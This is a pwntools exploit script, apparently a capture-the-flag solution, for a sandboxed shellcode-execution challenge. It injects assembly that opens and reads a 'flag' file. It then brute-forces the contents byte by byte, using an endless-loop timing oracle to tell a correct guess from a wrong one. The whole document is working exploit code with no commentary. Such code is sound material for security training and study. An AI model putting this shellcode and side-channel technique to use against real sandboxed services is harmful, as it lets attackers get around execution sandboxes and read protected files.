from pwn import *
import os
context.arch = 'amd64'
elf = ELF('chall')
p = 0
def pwn(index,content):
	global p			
	p = process('./chall')
	shellcode= shellcraft.open("flag") 
	shellcode+= shellcraft.open("flag") 
	shellcode+='''						
        xor rax, rax /* 0 */            
        push 0x64      					
        pop rdx                        
        mov rsi, rsp                    
	push 4                              
	pop rdi                           
        syscall                         
x:	mov rsi,rsp                        
	mov al,[rsi+'''+str(index)+''']    
	cmp al,'''+str(content)+'''       
	jz x       						  
	'''
	p.sendafter("safe-execution box?\n",asm(shellcode))
	p.recv(timeout = 1) 
	p.interactive()
	p.close()
	return 1
if __name__ == '__main__':       		
	flag=""
	index=0
	while(1):
		if '}' in flag:           
			break
		for i in range(0x20,0x7f): 
			try:                   
				print "flag=",flag
				if pwn(index,i) :     
					flag+=chr(i)	
					index+=1         
					break
			except EOFError:        
				print "error"
	print flag